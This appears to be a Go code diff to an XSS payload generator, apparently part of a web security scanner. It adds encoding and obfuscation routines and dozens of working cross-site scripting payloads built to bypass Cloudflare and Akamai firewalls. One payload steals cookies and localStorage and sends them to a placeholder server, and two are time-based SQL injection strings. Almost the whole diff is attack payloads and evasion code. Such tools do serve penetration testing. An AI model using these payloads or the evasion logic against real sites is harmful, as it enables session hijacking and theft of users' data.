@@ -36,6 +36,44 @@ func (g *Generator) LoadFromFile(filepath string) ([]string, error) {
 	return payloads, scanner.Err()
 }
 
+// LoadFromFileWithEncoding loads payloads from a custom file and optionally applies encoding
+func (g *Generator) LoadFromFileWithEncoding(filepath string, applyEncoding bool) ([]string, error) {
+	payloads, err := g.LoadFromFile(filepath)
+	if err != nil {
+		return nil, err
+	}
+
+	if !applyEncoding {
+		return payloads, nil
+	}
+
+	// Apply encoding/obfuscation to custom payloads
+	encoder := NewEncoder()
+	obfuscator := NewObfuscator()
+
+	var encodedPayloads []string
+	encodedPayloads = append(encodedPayloads, payloads...) // Original payloads
+
+	for _, p := range payloads {
+		// Obfuscation variants
+		encodedPayloads = append(encodedPayloads, obfuscator.GenerateVariants(p)...)
+
+		// URL encoding
+		encodedPayloads = append(encodedPayloads, encoder.URLEncode(p))
+		encodedPayloads = append(encodedPayloads, encoder.DoubleURLEncode(p))
+
+		// HTML entity encoding
+		encodedPayloads = append(encodedPayloads, encoder.HTMLEntityEncode(p))
+
+		// Unicode encoding for script payloads
+		if strings.Contains(p, "<script") || strings.Contains(p, "alert") {
+			encodedPayloads = append(encodedPayloads, encoder.UnicodeEncode(p))
+		}
+	}
+
+	return g.deduplicate(encodedPayloads), nil
+}
+
 // GetPayloads returns payloads optimized for the detected WAF
 func (g *Generator) GetPayloads(wafType string) []string {
 	// Pre-allocate slice with estimated capacity to reduce reallocations
@@ -57,12 +95,10 @@ func (g *Generator) GetPayloads(wafType string) []string {
 	// Add WAF-specific bypass payloads
 	payloads = append(payloads, g.getWAFSpecificPayloads(wafType)...)
 
-	// Add dynamic encodings and obfuscation for advanced WAF bypass
-	// This takes base payloads and applies random encoding/obfuscation
-	// Especially useful if a WAF is detected
-	if wafType != "" || g.smartMode {
-		encoder := NewEncoder()
-		obfuscator := NewObfuscator()
+	// ALWAYS apply dynamic encodings and obfuscation for built-in payloads
+	// This improves WAF bypass success rate
+	encoder := NewEncoder()
+	obfuscator := NewObfuscator()
 
 		var dynamicPayloads []string
 
@@ -87,7 +123,6 @@ func (g *Generator) GetPayloads(wafType string) []string {
 			}
 		}
 		payloads = append(payloads, dynamicPayloads...)
-	}
 
 	// Add smart/polyglot payloads if enabled
 	if g.smartMode {
@@ -248,6 +283,7 @@ func (g *Generator) getCloudflareBypass() []string {
 		// Unicode escapes
 		`<img src=x onerror=\u0061lert(1)>`,
 		`<svg onload=\u0061\u006c\u0065\u0072\u0074(1)>`,
+		`\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e`,
 
 		// Base64 + eval
 		`<svg onload=eval(atob('YWxlcnQoMSk='))>`,
@@ -267,6 +303,29 @@ func (g *Generator) getCloudflareBypass() []string {
 		// Tag obfuscation
 		`<ScRiPt>alert(1)</sCrIpT>`,
 		`<SCRIPT>alert(1)</SCRIPT>`,
+
+		// Tab encoding with href (Cloudflare specific bypass)
+		`<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>`,
+
+		// SVG Only=1 bypass (confirmed working)
+		`<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>`,
+		`<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==")>`,
+
+		// onclick with confirm bypass
+		`<a"/onclick=(confirm)(origin)>Click Here!`,
+
+		// Details ontoggle bypasses
+		`<details open ontoggle="{alert` + "`" + `1` + "`" + `}"></details>`,
+		`<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>`,
+
+		// Regex source concatenation
+		`<!--><svg+onload='top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)'>`,
+
+		// Script tag with throw/onerror pattern
+		`<script>throw/a/,Uncaught 1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>`,
+
+		// Location concatenation bypass
+		`"><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c">`,
 	}
 }
 
@@ -291,6 +350,18 @@ func (g *Generator) getAkamaiBypass() []string {
 		// Data URI
 		`<object data="data:text/html,<script>alert(1)</script>">`,
 		`<embed src="data:text/html,<script>alert(1)</script>">`,
+
+		// Window array method bypass with URL encoding
+		`%22onmouseover=window[%27al%27%2B%27er%27%2B([%27t%27,%27b%27,%27c%27][0])](document[%27cooki%27%2B(['e','c','z'][0])]);%22`,
+
+		// Angular 1.4.3 CSTI XSS Akamai WAF bypass
+		`{{([].toString()).constructor.prototype.charAt=[].join;$eval(([].toString()).constructor.fromCodePoint([120],[61],[49],[125],[125],[125],[59],[97],[108],[101],[114],[116],[40],[49],[41],[47],[47]));}}`,
+
+		// Reflect.get bypass
+		`"><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">`,
+
+		// srcdoc with unicode escape
+		`link=qwe"srcdoc="\u003ce<script%26Tab;src=//dom.xss>\u003ce</script%26Tab;e>`,
 	}
 }
 
@@ -422,7 +493,65 @@ func (g *Generator) getAllBypass() []string {
 	all = append(all, g.getCloudfrontBypass()...)
 	all = append(all, g.getImpervaBypass()...)
 	all = append(all, g.getModSecurityBypass()...)
+	all = append(all, g.getAdvancedBrowserPayloads()...)
 	return all
+}
+
+// getAdvancedBrowserPayloads returns advanced browser-specific XSS payloads
+// including Chrome-only events, modern event handlers, and creative bypass techniques
+func (g *Generator) getAdvancedBrowserPayloads() []string {
+	return []string{
+		// Simple XSS with img tag
+		`"><img src=x onerror=alert("XSS")>`,
+
+		// CSS animation based XSS
+		`<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt` + "`" + `${document.domain}` + "`" + `>`,
+
+		// Marquee loop bypass techniques
+		`<marquee+loop=1+width=0+onfinish='new+Function` + "`" + `al\\ert\\` + "`" + `1\\` + "`" + "`" + `'>`,
+		`%3Cmarquee%20loop=1%20width=%271%26apos;%27onfinish=self[` + "`" + `al` + "`" + `+` + "`" + `ert` + "`" + `](1)%3E%23leet%3C/marquee%3E`,
+
+		// onauxclick event (requires right-click or middle-click)
+		`<d3v/onauxclick=[2].some(confirm)>click`,
+		`<x onauxclick=a=alert,a(domain)>click`,
+		`</ScRiPt><img src=something onauxclick="new Function ` + "`" + `al\\ert\\` + "`" + `xss\\` + "`" + "`" + `">`,
+
+		// Chrome-only: onpointerrawupdate (works with multiple id values)
+		`?id="&id=onpointerrawupdate="a=confirm&id=a(1)`,
+		`%3Cx%20y=1%20z=%271%26apos;%27onclick=self[` + "`" + `al` + "`" + `%2B` + "`" + `ert` + "`" + `](1)%3E%23CLICK%20MEE`,
+
+		// Parameter pollution to attribute injection
+		`?id=1&id=2`,
+
+		// Reflected XSS variations
+		`"></script><script>alert(document.cookie)</script>`,
+		`"><img src=x onerror=alert(whoami)>`,
+
+		// onscrollend event (Chrome/Firefox modern event)
+		`<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:50px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>`,
+
+		// Advanced WAF bypass with encoding
+		`%0Ajavascript%3Ato%0ap%5B%27ale%27%2B%27rt%27%5D%28top%5B%27doc%27%2B%27ument%27%5D%5B%27dom%27%2B%27ain%27%5D%29%3B%0A/%0A/%0A`,
+
+		// Cookie and localStorage stealing payload
+		`<svg/onload='const url = ` + "`" + `https://yourserver/collect?cookie=${encodeURIComponent(document.cookie)}&localStorage=${encodeURIComponent(JSON.stringify(localStorage))}` + "`" + `; fetch(url);'>`,
+
+		// Email parameter XSS test
+		`test@gmail.com%27\\%22%3E%3Csvg/onload=alert(/xss/)%3E`,
+
+		// WordPress login bypass
+		`https://xxxxxxx/wp-login.php?wp_lang=%20=id=x+type=image%20id=xss%20onfoc%3C!%3Eusin+alert(0)%0c`,
+
+		// Popover/popovertarget XSS (modern HTML attribute)
+		`javascript:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget=x>Click me</button><hvita onbeforetoggle="+a+b+c+" popover id=x>Hvita</hvita>")`,
+
+		// type=image bypass with broken tags
+		`q=1" type=image sr>c<=x one>ror<="alert> (alert')`,
+
+		// DOM-based time sleep SQL injection (for hybrid testing)
+		`'XOR(if(now()=sysdate(),sleep(33),0))OR'`,
+		`14)%20AND%20(SELECT%207415%20FROM%20(SELECT(SLEEP(10)))CwkU)%20AND%20(7515=7515`,
+	}
 }
 
 // getSmartPayloads returns context-aware smart payloads
